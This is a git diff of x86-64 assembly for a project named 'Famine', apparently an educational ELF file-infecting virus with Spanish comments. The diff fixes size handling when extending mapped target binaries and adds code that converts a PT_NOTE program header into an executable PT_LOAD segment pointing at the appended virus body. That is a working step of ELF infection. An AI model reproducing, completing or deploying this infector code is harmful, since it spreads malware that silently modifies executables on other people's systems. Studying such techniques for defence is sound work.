@@ -24,7 +24,7 @@ section .text
     lea rax, _start
     lea rbx, _finish
     sub rbx, rax
-    mov VAR(Famine.virus_size), rbx
+    mov dword VAR(Famine.virus_size), ebx
 
     ;load dirs
     lea rdi, [dirs]
@@ -157,15 +157,15 @@ section .text
             .mmap:
 
                 ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
-                xor rax, rax
                 mov eax, dword VAR(Famine.file_original_len)
                 ; align current size to end at 4K page so our payload is aligned by writing it
                 ; at the end.
                 ALIGN rax
-                mov dword VAR(Famine.file_final_len), eax
-
-                mov rcx, VAR(Famine.virus_size)
+                mov ecx, dword VAR(Famine.virus_size)
                 add rax, rcx
+
+                ; save aligned size of file + virus size.
+                mov dword VAR(Famine.file_final_len), eax
 
                 ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
                 mov rdi, 0x0
@@ -191,7 +191,7 @@ section .text
                 movzx eax, word [rax + Elf64_Ehdr.e_phnum]
 
                 ; initialize variables seeked in loop header
-                xor rcx, rcx
+                xor ecx, ecx
                 mov VAR(Famine.note_phdr_ptr), rcx
                 mov VAR(Famine.max_vaddr_end), rcx
 
@@ -241,15 +241,19 @@ section .text
 
                 .end_loop_phdr:
 
+
                     cmp qword VAR(Famine.note_phdr_ptr), 0x0
                     je .close_file
+
 
                     cmp qword VAR(Famine.max_vaddr_end), 0x0
                     je .close_file
 
+
                 .ftruncate:
 
                     ; TRACE_TEXT hello, 11
+
 
                     ; ftruncate(fd_file, file_final_len)
                     mov rdi, VAR(Famine.fd_file)
@@ -258,13 +262,12 @@ section .text
                     mov rax, SC_FTRUNCATE
                     syscall
 
-                    ; mmap_ptr: puntero al mmap (ya de tamaño file_original_len + 0x4000)
-                    ; rbx = mmap_ptr
-                    mov rax, VAR(Famine.mmap_ptr)
 
-                    ; TEST DE ESCRITURA EN FINAL DE FICHERO.
-                    ; for ff in /tmp/test{,2}/*; do [ ! -d $ff ] && [ -f $ff ] && hexdump -C $ff | tail -2; done
+                ; TEST DE ESCRITURA EN FINAL DE FICHERO.
+                ; for ff in /tmp/test{,2}/*; do [ ! -d $ff ] && [ -f $ff ] && hexdump -C $ff | tail -2; done
+                .test_escritura:
                     ; ---> miras si aparecen tres A
+                    mov rax, VAR(Famine.mmap_ptr)
                     mov ecx, dword VAR(Famine.file_final_len)
                     dec rcx               ; penúltimo byte
                     add rax, rcx          ; rax = mmap_ptr + total_size - 1
@@ -272,6 +275,30 @@ section .text
                     mov byte [rax], 65    ; escribir 'A'
                     mov byte [rax-1], 65    ; escribir 'A'
                     mov byte [rax-2], 65    ; escribir 'A'
+
+                .mod_pt_note:
+
+                    ; Famine.note_phdr_ptr es una dirección de memoria que apunta a un puntero
+                    lea rax, VAR(Famine.note_phdr_ptr)
+                    mov rax, [rax]
+                    mov [rax], dword 0x01                    ; p_type = PT_LOAD
+                    mov [rax+Elf64_Phdr.p_flags], dword 0x05 ; p_flags = PF_X | PF_R
+
+                    mov ecx, dword VAR(Famine.file_final_len)
+                    sub ecx, dword VAR(Famine.virus_size)
+                    mov [rax+Elf64_Phdr.p_offset], rcx       ; p_offset = file_final_len - virus_size
+
+                    mov rcx, VAR(Famine.max_vaddr_end)
+                    ALIGN rcx
+                    mov [rax+Elf64_Phdr.p_vaddr], rcx        ; p_vaddr = ALIGN(max_pvaddr_len)
+                    mov [rax+Elf64_Phdr.p_paddr], rcx        ; p_paddr = p_vaddr
+
+                    mov ecx, dword VAR(Famine.virus_size)
+                    mov [rax+Elf64_Phdr.p_filesz], rcx       ; p_filesz = virus_size
+                    mov [rax+Elf64_Phdr.p_memsz], rcx        ; p_memsz = virus_size
+
+                    mov qword [rax+Elf64_Phdr.p_align], 0x1000     ; p_align = 0x1000 (4KB)
+
 
                 .munmap:
                     ;munmap(map_ptr, )
